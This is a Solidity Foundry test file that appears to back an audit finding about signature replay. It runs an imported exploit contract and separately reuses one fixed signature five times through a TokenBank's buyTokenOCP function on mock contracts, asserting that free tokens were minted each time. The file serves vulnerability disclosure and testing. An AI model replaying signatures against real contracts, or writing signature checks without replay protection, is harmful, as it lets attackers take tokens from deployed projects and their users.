// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./63777-signatures-on-tokenbank-and-allowlist-can-be-reused-in-perpe.sol";

contract SignatureReuseForeverTest is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.central().balanceOf(e.INVESTOR()), e.REPLAY_COUNT(), "replay minted free tokens");
        assertEq(e.bank().purchased(e.INVESTOR()), e.REPLAY_COUNT(), "purchased count");
    }

    function test_sameSignatureReusedManyTimes() public {
        MockCentralToken central = new MockCentralToken();
        SimpleAllowlist allow = new SimpleAllowlist();
        TokenBank bank = new TokenBank(central, address(allow));
        allow.addSigner(0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7);
        central.mint(address(bank), 5);

        bytes memory sig = abi.encodePacked(
            bytes32(0x296e28ff2e0e8e520424aef1a2ce1e30946713f102f2268efcb40eb963784a8b),
            bytes32(0x38310ab4bbdc431352c6a679a496703c56da4095cf7359e2bbe39e98707d2a48),
            uint8(28)
        );
        address investor = address(0xBEEF);
        address token = address(0xC2017A1);
        address signer = 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7;

        for (uint256 i = 0; i < 5; i++) {
            bank.buyTokenOCP(signer, investor, token, 1, sig);
        }
        assertEq(central.balanceOf(investor), 5);
    }
}
